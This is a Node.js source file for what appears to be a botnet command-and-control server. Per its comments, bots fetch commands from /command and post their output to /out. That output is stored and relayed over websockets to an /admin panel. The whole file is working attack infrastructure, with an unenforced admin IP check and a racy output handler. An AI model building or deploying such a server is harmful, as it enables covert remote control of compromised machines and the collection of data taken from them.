var https = require('https');
var sockjs = require('sockjs');
var fs = require('fs');
var express = require('express');
var path = require('path');
var _ = require('lodash');
var key = fs.readFileSync('./server.key');
var cert = fs.readFileSync('./server.crt')
var https_options = {
    key: key,
    cert: cert
};

var ADMIN_HOST = '127.0.0.1';
var PORT = 443;

clients = [];

var socket = sockjs.createServer();

// access all clients
broadcast = function (message) {
  clients.forEach(function (client) {
    client.write(message)
  });
};

function checkIP (req) {
  return ADMIN_HOST === req.connection.remoteAddress;
}

var connectionInitialized = function(req, res) {
  var date = new Date();  
  console.log("Connection Recieved:", date, res.connection.remoteAddress,
              req.url, req.headers['user-agent']);
};

socket.on('connection', function (client) {
  // Add client to clients array
  clients.push(client);
  console.log('New client connected (' + clients.length + ' total)');

  client.on('close', function() {
    // Remove from clients array
    clients = _.without(clients, client);
    console.log('Client disconnected (' + clients.length + ' total)');
  });

  setTimeout(function () {
  	var outfile = fs.readFileSync('./admin/out.txt').toString();
  	client.write(outfile)
  }, 5000)

  client.on('data', function (message) {
    //message = JSON.parse(message);
    console.log('SOCKET MESSAGE: ', message);
  });
});

var app = express();
server = https.createServer(https_options, app);

//The following are all bot api commands

// bots request commands from
app.get('/command', function(req, res) {
  connectionInitialized(req, res);
  fs.readFile('./admin/command', function(err, content) {
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(content, 'utf-8');
  });
});

// Post of Bot Output
app.post('/out', function(req, res) {
  connectionInitialized(req, res);
  var body = "";
    req.on('data', function (chunk) {
    body += chunk;
  });
  //Write post to file
  fs.createWriteStream("./admin/out.txt").once('open', function() {
    this.write(body);
    this.end();
  });
  //Return 200
  res.writeHead(200, { 'Content-Type': 'text/html' });
  res.end('ok', 'utf-8');
});

// Cmd Update
app.post('/cmdUpdate', function(req, res) {
  connectionInitialized(req, res);
  if (checkIP(req)) {
    //console.log(req.body, req.params);
  }else {
   // res.write("Unauthorized"); 
  }
  res.writeHead(302, { 
  'Location': '/admin',
  'Content-Type': 'text/html' });
  res.end('ok', 'utf-8');
});

// thing for websockets to connect over
socket.installHandlers(server, { prefix: '/websocket' })

// serve static content from the /admin/ dir at /admin
app.use('/admin/', express.static(path.join(__dirname, '/admin')));

server.listen(PORT, function() {
  console.log("Listening on port "+PORT+"....");
});
